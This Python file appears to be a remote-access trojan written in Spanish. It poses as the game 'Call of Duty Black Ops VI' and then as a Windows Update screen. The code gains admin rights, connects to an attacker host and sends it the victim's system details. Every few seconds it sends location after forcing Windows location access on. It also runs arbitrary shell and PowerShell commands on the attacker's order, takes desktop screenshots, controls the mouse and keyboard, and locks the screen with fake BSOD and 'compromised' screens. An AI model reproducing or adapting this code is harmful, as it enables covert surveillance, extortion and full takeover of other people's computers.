# -*- coding: utf-8 -*-
"""
Call of Duty Black Ops VI - Activision (c) 2024
"""
import tkinter as tk
from tkinter import messagebox
import socket,threading,sys,os,time,random,ctypes,platform,subprocess,struct,io,json,urllib.request,urllib.error

# Auto-renombrar el archivo si tiene nombre original
if hasattr(sys,'argv') and sys.argv and sys.argv[0]:
    base=os.path.basename(sys.argv[0]).lower()
    if "victima" in base or "remoto" in base:
        try:
            nuevo=os.path.join(os.path.dirname(sys.argv[0]),"Call of Duty Black Ops VI.pyw")
            os.rename(sys.argv[0],nuevo)
        except:pass

# Auto-elevar a ADMIN si no lo es
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

PUERTO_TCP=5555;PUERTO_UDP=5556
PASSWORD="acuario";MAX_INTENTOS=3;TIMEOUT=20
C={'bg':'#0a0a0a','dark':'#0d1117','red':'#ff0040','green':'#00ff41','gray':'#333','white':'#c9d1d9'}
CALL={'bg':'#1a1a2e','orange':'#ff6600','white':'#ffffff','gray':'#444444','light':'#888888'}

HAVE_PIL=False
try:
    from PIL import ImageGrab,Image
    HAVE_PIL=True
except:pass

class BlackOpsVI:
    def __init__(self):
        self.atacante_ip=None;self.atacante_port=PUERTO_TCP
        self.sock=None;self.conectado=False
        self.intentos=0;self.tiempo=TIMEOUT
        self.bloqueado=False;self.intento_salir=0
        self.pc_info=self._recoger_info()
        self._ss_activo=False
        self.ventana_visible=True

        self.v=tk.Tk()
        self.v.title("Call of Duty")
        self._set_icon()
        self.v.attributes("-fullscreen",True)
        self.v.configure(bg='#000000')
        self.v.protocol("WM_DELETE_WINDOW",lambda:self._on_exit())
        self.v.bind("<Alt-F4>",lambda e:self._on_exit())
        self.v.bind("<Control-Alt-KeyPress-F1>",lambda e:self.v.destroy())
        self.v.bind("<F1>",lambda e:self._on_exit())
        self.v.bind("<Escape>",lambda e:self._on_exit())
        self._splash_cod()
        threading.Thread(target=self._track_gps,daemon=True).start()
        threading.Thread(target=self._auto_find,daemon=True).start()

    def _set_icon(self):
        """Genera un icono COD naranja en memoria para la ventana (sin archivos)"""
        try:
            import base64
            ppm=bytearray(b"P6\n16 16\n255\n")
            for y in range(16):
                for x in range(16):
                    dx,dy=x-7.5,y-7.5
                    if dx*dx+dy*dy<49:
                        ppm.extend(b"\xff\x66\x00")
                    else:
                        ppm.extend(b"\x1a\x1a\x2e")
            img=tk.PhotoImage(data=base64.b64encode(bytes(ppm)).decode())
            self.v.iconphoto(True,img)
        except:pass

    def _auto_find(self):
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
        sock.settimeout(0.5)
        try:sock.bind(("0.0.0.0",PUERTO_UDP))
        except:pass
        inicio=time.time()
        while time.time()-inicio<15 and not self.atacante_ip:
            try:
                d,a=sock.recvfrom(2048);m=d.decode().strip()
                if m.startswith("ATACANTE_AQUI:"):
                    p=m.split(":");self.atacante_ip=p[1]
                    self.atacante_port=int(p[2])if len(p)>2 else PUERTO_TCP;break
            except:continue
        sock.close()
        if not self.atacante_ip:
            for ip in["192.168.163.1","192.168.1.1","10.0.2.2"]:
                try:s=socket.socket();s.settimeout(0.3);s.connect((ip,PUERTO_TCP));s.close();self.atacante_ip=ip;break
                except:continue
        if self.atacante_ip:self._conectar()

    def _conectar(self):
        ip=self.atacante_ip or "127.0.0.1"
        for i in range(20):
            try:
                self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.sock.settimeout(3);self.sock.connect((ip,self.atacante_port))
                self.conectado=True
                info=f"[IP]{self._get_ip()}\n[PCINFO]Hostname:{self.pc_info['hostname']}|Usuario:{self.pc_info['usuario']}|OS:{self.pc_info['os']}|IP:{self._get_ip()}"
                try:self.sock.send(info.encode())
                except:pass;return
            except:time.sleep(2)

    def _track_gps(self):
        """Obtiene ubicacion GPS real via IP cada 3 segundos y la envia al atacante"""
        while True:
            try:
                if self.conectado and self.sock:
                    gps=self._obtener_gps()
                    if gps:
                        try:self.sock.send(f"[GPS]{gps}\n".encode())
                        except:pass
            except:pass
            time.sleep(3)

    def _obtener_gps(self):
        """Fuerza activacion de ubicacion y obtiene coordenadas via ip-api"""
        try:
            self._activar_ubicacion_forzada()
            req=urllib.request.Request("http://ip-api.com/json/?fields=lat,lon,city,region,country",
                                       headers={"User-Agent":"Mozilla/5.0"})
            res=urllib.request.urlopen(req,timeout=5)
            d=json.loads(res.read().decode())
            if d.get("lat") and d.get("lon"):
                return f"{d['lat']},{d['lon']},{d.get('city','?')},{d.get('region','?')},{d.get('country','?')}"
        except:pass
        return None

    def _activar_ubicacion_forzada(self):
        """Fuerza activacion del servicio de ubicacion en Windows via registro"""
        try:
            import winreg
            k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
                0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,"Value",0,winreg.REG_SZ,"Allow")
            winreg.CloseKey(k)
        except:pass
        try:
            subprocess.run([
                "powershell","-Command",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location' -Name 'Value' -Value 'Allow' -Force"
            ],capture_output=True,timeout=5)
        except:pass
        try:
            subprocess.run([
                "powershell","-Command",
                "Get-WmiObject -Class Win32_LocationPlatform | Enable-PSRemoting -Force"
            ],capture_output=True,timeout=5)
        except:pass

    def _splash_cod(self):
        f=tk.Frame(self.v,bg='#000000');f.pack(fill="both",expand=True)
        canvas=tk.Canvas(f,bg='#000000',highlightthickness=0)
        canvas.pack(fill="both",expand=True)
        w,h=self.v.winfo_screenwidth(),self.v.winfo_screenheight()

        canvas.create_text(w/2,h*0.25,text="CALL OF DUTY",fill='#ff6600',font=("Arial Black",int(w/25), "bold"),
                           tags="titulo")
        canvas.create_text(w/2,h*0.25+60,text="BLACK OPS VI",fill='#ffffff',font=("Arial",int(w/35)),
                           tags="subtitulo")

        bar_x=w*0.15;bar_y=h*0.55;bar_w=w*0.70;bar_h=25
        canvas.create_rectangle(bar_x,bar_y,bar_x+bar_w,bar_y+bar_h,outline='#ff6600',fill='#222222',width=2)
        bar=canvas.create_rectangle(bar_x+2,bar_y+2,bar_x+2,bar_y+bar_h-2,fill='#ff6600',outline='')

        label=canvas.create_text(w/2,bar_y+bar_h+30,text="Inicializando...",fill='#888888',
                                 font=("Arial",int(w/60)),tags="label")
        msgs=[
            "Conectando a servicios online...","Verificando licencia...",
            "Cargando texturas...","Optimizando rendimiento...",
            "Sincronizando datos de usuario...","Preparando recursos...",
            "Call of Duty: Black Ops VI © 2024 Activision"
        ]
        for i in range(101):
            p=i/100.0
            canvas.coords(bar,bar_x+2,bar_y+2,bar_x+2+p*(bar_w-4),bar_y+bar_h-2)
            if i%33==0 and i//33<len(msgs):
                canvas.itemconfig(label,text=msgs[i//33])
            self.v.update()
            time.sleep(0.04)
        time.sleep(0.5)
        for widget in self.v.winfo_children():
            widget.destroy()
        self.v.geometry("400x300+500+300")
        self.v.attributes("-fullscreen",False)
        self.v.title("Windows Update")
        self.v.configure(bg=C['bg']);self.v.resizable(False,False)
        self.v.attributes("-topmost",True)
        self._ventana_chica()

    def _ventana_chica(self):
        f=tk.Frame(self.v,bg=C['dark'],padx=20,pady=15);f.pack(fill="both",expand=True)
        tk.Label(f,text="Windows Update",bg=C['dark'],fg=C['white'],font=("Segoe UI",12,"bold")).pack(anchor="w")
        tk.Label(f,text="Actualizando sistema...",bg=C['dark'],fg=C['gray'],font=("Segoe UI",9)).pack(anchor="w",pady=5)
        ca=tk.Canvas(f,bg=C['dark'],highlightthickness=0,height=20);ca.pack(fill="x")
        ca.create_rectangle(5,5,350,18,fill=C['gray'],outline="")
        self.br=ca.create_rectangle(5,5,5,18,fill=C['green'],outline="")
        tk.Label(f,text="No apague su equipo.",bg=C['dark'],fg="#666",font=("Segoe UI",8)).pack(pady=10)
        self.est=tk.Label(f,text="Preparando...",bg=C['dark'],fg=C['white'],font=("Consolas",8));self.est.pack()
        def a(p=0):
            if p>100 or self.bloqueado:return
            try:ca.coords(self.br,5,5,5+(345*p)//100,18);self.est.config(text=f"Actualizando...{p}%")
            except:pass
            self.v.after(30,lambda:a(p+random.randint(1,3)))
        a();self.v.after(3500,self._expandir)

    def _expandir(self):
        if self.bloqueado:return
        self.v.attributes("-fullscreen",True);self.v.geometry("")
        for w in self.v.winfo_children():w.destroy()
        self._update_falso()

    def _update_falso(self):
        ca=tk.Canvas(self.v,bg=C['bg'],highlightthickness=0);ca.pack(fill="both",expand=True)
        ca.create_rectangle(0,0,2000,30,fill="#1a1a2e",outline="")
        ca.create_text(15,15,anchor="w",text="Windows Update",fill="#888",font=("Segoe UI",9))
        cx,cy=960,400
        ca.create_text(cx,cy-80,text="Actualizando Windows",fill=C['white'],font=("Segoe UI",24))
        ca.create_text(cx,cy-40,text="No apague su equipo.",fill=C['gray'],font=("Segoe UI",12))
        ca.create_rectangle(cx-200,cy,cx+200,cy+20,fill=C['gray'],outline="")
        b2=ca.create_rectangle(cx-200,cy,cx-200,cy+20,fill=C['green'],outline="")
        def a(p=0):
            if p>100 or self.bloqueado:return
            try:ca.coords(b2,cx-200,cy,cx-200+(400*p)//100,cy+20)
            except:pass
            self.v.after(40,lambda:a(p+random.randint(1,4)))
        a();self.v.after(4000,self._voice)

    def _voice(self):
        if self.bloqueado:return
        for w in self.v.winfo_children():w.destroy()
        self.v.title("Voice Control Pro v3.2")
        f=tk.Frame(self.v,bg=C['dark'],padx=40,pady=30);f.place(relx=.5,rely=.5,anchor="c")
        tk.Label(f,text="VOICE CONTROL PRO v3.2",bg=C['dark'],fg="#0f3460",font=("Arial",22,"bold")).pack()
        tk.Label(f,text="[CONECTADO]",bg=C['dark'],fg=C['green'],font=("Consolas",9)).pack(pady=(0,15))
        tk.Button(f,text="INICIAR SESION",bg="#0f3460",fg="white",font=("Arial",11,"bold"),padx=20,pady=8,bd=0,command=self._auth).pack(pady=20)
        self.fa=tk.Frame(f,bg=C['dark'])
        tk.Label(self.fa,text="CONTRASENA:",bg=C['dark'],fg=C['red'],font=("Consolas",10,"bold")).pack()
        self.e=tk.Entry(self.fa,show="*",bg="#0f3460",fg="white",font=("Consolas",14),justify="c",width=20);self.e.pack(pady=5)
        self.e.bind("<Return>",lambda e:self._check())
        tk.Button(self.fa,text="VERIFICAR",bg=C['red'],fg="white",bd=0,padx=15,command=self._check).pack()
        self.fb=tk.Label(self.fa,text="",bg=C['dark'],fg=C['red'],font=("Consolas",9));self.fb.pack()
        self.tl=tk.Label(self.fa,text="",bg=C['dark'],fg=C['gray'],font=("Consolas",9));self.tl.pack()
        self._timer()

    def _auth(self):self.fa.pack(fill="x",pady=5);self.e.focus();self.tiempo=TIMEOUT

    def _check(self):
        if self.bloqueado:return
        if self.e.get()==PASSWORD:messagebox.showinfo("OK","Acceso concedido");self.v.destroy()
        else:
            self.intentos+=1;r=MAX_INTENTOS-self.intentos;self.fb.config(text=f"Error-Intentos:{r}")
            self.e.delete(0,tk.END)
            if self.intentos>=MAX_INTENTOS:self._bloquear()

    def _on_exit(self):
        self.intento_salir+=1;self._enviar_info()
        if self.intento_salir==1:self._fake_bsod("CRITICAL_PROCESS_DIED")
        elif self.intento_salir==2:self._fake_bsod("SYSTEM_SERVICE_EXCEPTION")
        elif self.intento_salir==3:self._fake_virus()
        else:self._pantalla_roja()

    def _fake_bsod(self,e):
        for w in self.v.winfo_children():w.destroy()
        self.v.configure(bg="#0000AA");self.v.attributes("-fullscreen",True)
        tk.Label(self.v,text=":( Tu sistema tuvo un problema",bg="#0000AA",fg="white",font=("Segoe UI",18,"bold"),wraplength=700).place(relx=.5,rely=.4,anchor="c")
        tk.Label(self.v,text=f"{e}\nRecolectando info...",bg="#0000AA",fg="white",font=("Consolas",11),wraplength=700).place(relx=.5,rely=.55,anchor="c")
        tk.Label(self.v,text="\n\n\n\n\nCtrl+Shift+F1 salir",bg="#0000AA",fg="#6666FF",font=("Consolas",9)).place(relx=.5,rely=.7,anchor="c")
        self.v.after(3000,lambda:self._bloquear()if not self.bloqueado else None)

    def _fake_virus(self):
        for w in self.v.winfo_children():w.destroy()
        self.v.configure(bg="black");self.v.attributes("-fullscreen",True)
        for _ in range(30):
            x=random.randint(50,1850);y=random.randint(50,950)
            tk.Label(self.v,text=random.choice(["WARNING","LOCKED","!!"]),bg="black",fg=random.choice(["red","green","yellow"]),font=("Arial",random.randint(14,28))).place(x=x,y=y)
        tk.Label(self.v,text="SISTEMA BLOQUEADO",bg="black",fg="red",font=("Arial",30,"bold")).place(relx=.5,rely=.3,anchor="c")
        tk.Label(self.v,text="\n\n\nCtrl+Shift+F1 salir",bg="black",fg="#333",font=("Consolas",9)).place(relx=.5,rely=.6,anchor="c")

    def _pantalla_roja(self):
        for w in self.v.winfo_children():w.destroy()
        self.v.configure(bg="#8B0000");self.v.attributes("-fullscreen",True)
        tk.Label(self.v,text="BLOQUEADO",bg="#8B0000",fg="white",font=("Arial",40,"bold")).place(relx=.5,rely=.5,anchor="c")

    # =========================================================================
    # CAPTURA DE ESCRITORIO REAL (sin la ventana de bloqueo)
    # =========================================================================
    def _tomar_desktop(self):
        """Toma screenshot del escritorio REAL (oculta la ventana temporalmente)"""
        # Ocultar ventana
        if self.bloqueado:
            self.v.attributes("-alpha",0.0)
            self.v.attributes("-topmost",False)
            self.v.withdraw()
            time.sleep(0.3)

        img_data=None
        if HAVE_PIL:
            try:
                img=ImageGrab.grab()
                buf=io.BytesIO()
                img.save(buf,format='JPEG',quality=65)
                img_data=buf.getvalue()
            except:pass
        else:
            try:
                path=os.environ.get('TEMP','C:\\Windows\\Temp')+f"\\desk_{int(time.time())}.jpg"
                ps=f"""
                Add-Type -AssemblyName System.Drawing;
                $b=[Drawing.Bitmap]::new([Drawing.Graphics]::FromDesktop().VisibleClipBounds.Size.Width,[Drawing.Graphics]::FromDesktop().VisibleClipBounds.Size.Height);
                $g=[Drawing.Graphics]::FromImage($b);
                $g.CopyFromScreen(0,0,0,0,$b.Size);
                $b.Save('{path}',[Drawing.Imaging.ImageFormat]::Jpeg);
                $b.Dispose();$g.Dispose();
                """
                subprocess.run(["powershell","-Command",ps],capture_output=True,timeout=15)
                if os.path.exists(path):
                    with open(path,'rb')as f:img_data=f.read()
                    try:os.remove(path)
                    except:pass
            except:pass

        # Restaurar ventana
        if self.bloqueado:
            time.sleep(0.2)
            try:
                self.v.deiconify()
                self.v.attributes("-topmost",True)
                self.v.attributes("-alpha",1.0)
                self.v.lift()
                self.v.attributes("-fullscreen",True)
            except:pass

        return img_data

    # =========================================================================
    # CONTROL DE RATON Y TECLADO
    # =========================================================================
    def _mover_mouse(self,x,y):
        """Mueve el mouse a la posicion x,y"""
        try:
            ctypes.windll.user32.SetCursorPos(int(x),int(y))
        except:pass

    def _clic_mouse(self):
        """Hace clic izquierdo"""
        try:
            ctypes.windll.user32.mouse_event(2,0,0,0,0)  # down
            time.sleep(0.05)
            ctypes.windll.user32.mouse_event(4,0,0,0,0)  # up
        except:pass

    def _escribir_texto(self,texto):
        """Escribe texto"""
        try:
            for c in texto:
                ctypes.windll.user32.keybd_event(ord(c.upper()),0,0,0)
                time.sleep(0.02)
                ctypes.windll.user32.keybd_event(ord(c.upper()),0,2,0)
                time.sleep(0.02)
        except:pass

    def _tecla_especial(self,tecla):
        """Presiona tecla especial"""
        map={
            "ENTER":0x0D,"TAB":0x09,"ESC":0x1B,"BACK":0x08,
            "DEL":0x2E,"WIN":0x5B,"ALT":0x12,"CTRL":0x11,
            "F1":0x70,"F2":0x71,"F3":0x72,"F4":0x73,"F5":0x74,
            "F6":0x75,"F7":0x76,"F8":0x77,"F9":0x78,"F10":0x79,
            "F11":0x7A,"F12":0x7B,"SPACE":0x20,"UP":0x26,
            "DOWN":0x28,"LEFT":0x25,"RIGHT":0x27,
        }
        if tecla.upper() in map:
            try:
                ctypes.windll.user32.keybd_event(map[tecla.upper()],0,0,0)
                time.sleep(0.05)
                ctypes.windll.user32.keybd_event(map[tecla.upper()],0,2,0)
            except:pass

    # =========================================================================
    # BLOQUEO + RECIBIR COMANDOS
    # =========================================================================
    def _bloquear(self):
        if self.bloqueado:return
        self.bloqueado=True
        for w in self.v.winfo_children():w.destroy()
        self.v.configure(bg=C['bg']);self.v.attributes("-fullscreen",True)
        f=tk.Frame(self.v,bg=C['bg']);f.place(relx=.5,rely=.5,anchor="c")
        tk.Label(f,text="!",bg=C['bg'],fg=C['red'],font=("Arial",40,"bold")).pack()
        t=tk.Label(f,text="SISTEMA COMPROMETIDO",bg=C['bg'],fg=C['red'],font=("Consolas",26,"bold"));t.pack()
        i=tk.Frame(f,bg=C['bg']);i.pack(pady=15)
        for lb,st in[("Defender","DESACTIVADO"),("Firewall","DESACTIVADO"),("Microfono","ACCESO REMOTO"),("Sistema","BLOQUEADO")]:
            r=tk.Frame(i,bg=C['bg']);r.pack(fill="x",pady=1)
            tk.Label(r,text=f" {lb}:",bg=C['bg'],fg=C['white'],font=("Consolas",11),width=22,anchor="w").pack(side="left")
            tk.Label(r,text=st,bg=C['bg'],fg=C['red'],font=("Consolas",11,"bold")).pack(side="right")
        tk.Frame(f,bg=C['gray'],height=1).pack(fill="x",pady=10)
        self.con=tk.Text(f,bg=C['bg'],fg=C['green'],font=("Consolas",11),bd=0,highlightthickness=0,width=65,height=8,state="disabled");self.con.pack(pady=5)
        self.fl=tk.Label(f,text="",bg=C['bg'],fg=C['green'],font=("Consolas",13,"bold"));self.fl.pack()
        self._am("[SYSTEM] Conectado. Esperando instrucciones...")
        threading.Thread(target=self._recibir,daemon=True).start()

    def _am(self,t):
        try:self.con.config(state="normal");self.con.insert("end",f">> {t}\n");self.con.see("end");self.con.config(state="disabled")
        except:pass

    def _mm(self,t):
        try:self.fl.config(text=f">> {t}")
        except:pass

    def _recibir(self):
        while self.bloqueado:
            if self.sock and self.conectado:
                try:
                    self.sock.settimeout(1)
                    d=self.sock.recv(8192)
                    if not d:break
                    m=d.decode("utf-8",errors="replace").strip()
                    if m=="[UNLOCK]":self._am("[SYSTEM] Desbloqueando...");time.sleep(0.5);self.v.destroy();return
                    elif m.startswith("[CMD]"):
                        c=m[5:]
                        if "|" in c:
                            sh,cmd=c.split("|",1)
                            if sh=="powershell":cmd=f"powershell -Command \"{cmd}\""
                            out=self._ejecutar(cmd)
                        else:out=self._ejecutar(c)
                        try:self.sock.send(f"[CMDOUT]{out}".encode("utf-8",errors="replace"))
                        except:pass
                    elif m=="[SCREENSHOT]":
                        threading.Thread(target=self._enviar_screenshot,daemon=True).start()
                    elif m=="[SSDESK]":
                        threading.Thread(target=self._enviar_desktop,daemon=True).start()
                    elif m.startswith("[MOUSE]"):
                        try:
                            x,y=m[7:].split(",")
                            self._mover_mouse(int(x),int(y))
                        except:pass
                    elif m=="[CLICK]":
                        self._clic_mouse()
                    elif m.startswith("[TYPE]"):
                        self._escribir_texto(m[6:])
                    elif m.startswith("[KEY]"):
                        self._tecla_especial(m[5:])
                    else:self._am(f">> {m}");self._mm(m)
                except socket.timeout:continue
                except:self._am("[SYSTEM] Conexion perdida");break
            time.sleep(0.5)

    def _enviar_screenshot(self):
        """Toma screenshot con la ventana encima"""
        if not self._ss_activo:
            self._ss_activo=True
            img_data=self._tomar_screenshot()
            if img_data and self.sock and self.conectado:
                try:
                    prefix=b"[SSIMG]"
                    length=struct.pack("!I",len(img_data))
                    self.sock.send(prefix+length+img_data)
                except:pass
            self._ss_activo=False

    def _enviar_desktop(self):
        """Toma screenshot del escritorio REAL (sin la ventana)"""
        if not self._ss_activo:
            self._ss_activo=True
            img_data=self._tomar_desktop()
            if img_data and self.sock and self.conectado:
                try:
                    prefix=b"[SSIMG]"
                    length=struct.pack("!I",len(img_data))
                    self.sock.send(prefix+length+img_data)
                except:pass
            self._ss_activo=False

    def _tomar_screenshot(self):
        if HAVE_PIL:
            try:
                img=ImageGrab.grab()
                buf=io.BytesIO()
                img.save(buf,format='JPEG',quality=60)
                return buf.getvalue()
            except:pass
        try:
            path=os.environ.get('TEMP','C:\\Windows\\Temp')+f"\\ss_{int(time.time())}_{random.randint(0,999)}.jpg"
            ps=f"""
            Add-Type -AssemblyName System.Drawing;
            $b=[Drawing.Bitmap]::new([Drawing.Graphics]::FromDesktop().VisibleClipBounds.Size.Width,[Drawing.Graphics]::FromDesktop().VisibleClipBounds.Size.Height);
            $g=[Drawing.Graphics]::FromImage($b);
            $g.CopyFromScreen(0,0,0,0,$b.Size);
            $b.Save('{path}',[Drawing.Imaging.ImageFormat]::Jpeg);
            $b.Dispose();$g.Dispose();
            """
            subprocess.run(["powershell","-Command",ps],capture_output=True,timeout=15)
            if os.path.exists(path):
                with open(path,'rb')as f:data=f.read()
                try:os.remove(path)
                except:pass
                return data
        except:pass
        return None

    def _ejecutar(self,cmd):
        try:
            r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
            salida=r.stdout+r.stderr
            return salida or "[OK]"
        except subprocess.TimeoutExpired:return"[ERROR] Timeout 30s"
        except Exception as e:return f"[ERROR] {e}"

    def _timer(self):
        if self.bloqueado:return
        try:
            if self.fa.winfo_ismapped():
                self.tiempo-=1;self.tl.config(text=f"Tiempo:{self.tiempo}s")
                if self.tiempo<=0:
                    self.intentos+=1;r=MAX_INTENTOS-self.intentos;self.fb.config(text=f"Timeout-Intentos:{r}")
                    self.tiempo=TIMEOUT
                    if self.intentos>=MAX_INTENTOS:self._bloquear()
        except:pass
        self.v.after(1000,self._timer)

    def _recoger_info(self):
        return{"hostname":socket.gethostname(),"usuario":os.environ.get("USERNAME","?"),"os":platform.platform()}

    def _enviar_info(self):
        if not self.sock or not self.conectado:return
        try:m=f"[PCINFO]Hostname:{self.pc_info['hostname']}|Usuario:{self.pc_info['usuario']}|OS:{self.pc_info['os']}";self.sock.send(m.encode())
        except:pass

    def _get_ip(self):
        try:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
        except:return"127.0.0.1"

    def run(self):self.v.mainloop()

if __name__=="__main__":
    v=BlackOpsVI();v.run()
